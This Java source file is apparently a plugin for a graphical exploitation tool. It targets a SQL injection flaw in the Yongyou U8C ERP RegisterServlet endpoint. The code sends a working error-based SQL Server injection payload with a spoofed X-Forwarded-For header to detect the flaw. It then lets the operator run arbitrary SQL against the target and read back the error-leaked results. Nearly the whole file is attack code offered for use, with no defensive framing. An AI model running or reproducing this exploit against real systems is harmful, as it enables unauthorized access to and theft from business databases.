package exp.oa.yongyou.u8c;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import java.util.HashMap;

public class yongyou_U8C_RegisterServlet_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("X-Forwarded-For","127.0.0.1");
            String var = "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--";
            Response get_res = HttpTools.post(url + "/servlet/RegisterServlet" ,var, head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("e10")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_U8C_RegisterServlet_sqli ]");
                    textArea.appendText("\n CMD处输入sql语句执行，注入类型error注入,sql:sqlserver");
                    textArea.appendText("\n eg: 1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--");
                    textArea.appendText("\n");
                });

                String target_req = "POST /servlet/RegisterServlet HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n" +
                        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n" +
                        "Cookie: JSESSIONID=C4AFE527EB3C99B9E4573E91CA06E642\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Content-Length: 53\n" +
                        "\n" +
                        "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--";
                Platform.runLater(() -> {
                    textArea_cmd.appendText(target_req);
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public String error_sqli(String url,String sql){
        try{
            HashMap<String, String> head = new HashMap<>();
            head.put("X-Forwarded-For","127.0.0.1");
            String var = sql;
            Response res = HttpTools.post(url ,var, head, "utf-8");
            if(res.getText().contains("rror")){
                return res.getText();
            }
        }catch(Exception e) {
            e.printStackTrace();
            return null;
        }
        return null;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        String var1 = error_sqli(url+"/servlet/RegisterServlet","usercode="+sql);
        if(var1 != null){
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText(var1 +"\n");
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
